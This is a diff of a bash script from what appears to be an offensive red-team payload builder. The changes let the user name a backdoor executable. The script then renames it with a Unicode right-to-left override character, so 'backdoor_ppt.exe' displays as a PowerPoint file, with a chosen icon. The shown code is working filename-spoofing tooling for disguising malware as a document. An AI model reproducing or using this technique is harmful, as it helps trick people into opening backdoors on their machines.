@@ -196,10 +196,8 @@ IcOn=$(zenity --list --title "☠ ICON REPLACEMENT  ☠" --text "Chose one icon 
     PaTh="$IPATH/icons/$IcOn"
   fi
 fi
-# Input payload output name (bash transformation) ..
-if [ "$tRan" = "YES" ];then
+# Input payload output name ..
 MiP=$(zenity --entry --title "☠ PAYLOAD FINAL NAME ☠" --text "example: curriculum" --width 300) > /dev/null 2>&1
-fi
 
 
   #
@@ -282,7 +280,13 @@ cat << !
   if [ "$tRan" = "YES" ]; then
     echo "bash build" > /dev/null 2>&1
   else
-    ruby -e 'File.rename("backdoor_ppt.exe", "s\xe2\x80\xaetpp.exe")'
+    echo "$MiP" > outname.txt
+    #
+    # Ruby command to READ 'te.txt' that contains agent output name, then
+    # Stores it into 'fil' variable to be able to rename the agent output name ..
+    #
+    ruby -e 'fil = File.read("outname.txt") and File.rename("backdoor_ppt.exe", "#{fil}\xe2\x80\xaetpp.exe")'
+    rm outname.txt > /dev/null 2>&1
   fi
   cd $IPATH
   sleep 1
@@ -305,7 +309,7 @@ fi
   else
     echo ""
     echo ${RedF}"    Icon select : $IcOn"${Reset};
-    echo ${RedF}"    Final file  : $IPATH/output/sexe.ppt"${Reset};
+    echo ${RedF}"    Final file  : $IPATH/output/goodsexe.ppt"${Reset};
     echo ${RedF}"    Tool Author : r00t-3xp10it (SSA RedTeam)"${Reset};
   fi
 
